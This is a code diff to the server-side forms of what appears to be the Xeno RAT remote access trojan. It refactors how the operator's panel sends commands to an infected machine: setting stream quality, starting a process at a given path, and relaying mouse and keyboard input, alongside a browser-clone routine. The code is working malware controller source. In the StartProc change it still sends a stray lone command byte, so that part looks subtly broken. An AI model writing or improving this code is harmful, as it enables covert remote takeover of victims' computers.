@@ -63,9 +63,8 @@ namespace xeno_rat_server.Forms
             await client.SendAsync(new byte[] { 1 });
         }
         public async Task SetQuality(int quality)
-        {
-            await client.SendAsync(new byte[] { 2 });
-            await client.SendAsync(client.sock.IntToBytes(quality));
+        {   
+            await client.SendAsync(client.sock.Concat(new byte[] { 2 }, client.sock.IntToBytes(quality)));
         }
         public void TempOnDisconnect(Node node)
         {
@@ -120,8 +119,8 @@ namespace xeno_rat_server.Forms
         private async Task StartProc(string path) 
         {
             if (!playing) return;
+            await client.SendAsync(client.sock.Concat(new byte[] { 5 }, Encoding.UTF8.GetBytes(path)));
             await client.SendAsync(new byte[] { 5 });
-            await client.SendAsync(Encoding.UTF8.GetBytes(path));
         }
 
         private async Task EnableBrowserClone() 
@@ -454,6 +453,7 @@ namespace xeno_rat_server.Forms
                 base.WndProc(ref m);
                 return;
             }
+            byte[] payload;
             switch (m.Msg)
             {
                 case 0x0201: // WM_LBUTTONDOWN
@@ -483,10 +483,10 @@ namespace xeno_rat_server.Forms
                     int IlParam = (int)lParam;
                     Task.Run(async () =>
                     {
-                        await client.SendAsync(new byte[] { 3 });
-                        await client.SendAsync(client.sock.IntToBytes(Imsg));
-                        await client.SendAsync(client.sock.IntToBytes(IwParam));
-                        await client.SendAsync(client.sock.IntToBytes(IlParam));
+                        payload = client.sock.Concat(new byte[] { 3 }, client.sock.IntToBytes(Imsg));
+                        payload = client.sock.Concat(payload, client.sock.IntToBytes(IwParam));
+                        payload = client.sock.Concat(payload, client.sock.IntToBytes(IlParam));
+                        await client.SendAsync(payload);
                     }).Wait();
                     break;
 
@@ -532,7 +532,6 @@ namespace xeno_rat_server.Forms
                             {
                                 msg = 0x0102;
                             }
-
                         }
                     }
                     Imsg = (int)msg;
@@ -540,10 +539,10 @@ namespace xeno_rat_server.Forms
                     IlParam = (int)lParam;
                     Task.Run(async () =>
                     {
-                        await client.SendAsync(new byte[] { 3 });
-                        await client.SendAsync(client.sock.IntToBytes(Imsg));
-                        await client.SendAsync(client.sock.IntToBytes(IwParam));
-                        await client.SendAsync(client.sock.IntToBytes(IlParam));
+                        payload = client.sock.Concat(new byte[] { 3 }, client.sock.IntToBytes(Imsg));
+                        payload = client.sock.Concat(payload, client.sock.IntToBytes(IwParam));
+                        payload = client.sock.Concat(payload, client.sock.IntToBytes(IlParam));
+                        await client.SendAsync(payload);
                     }).Wait();
                     break;
             }
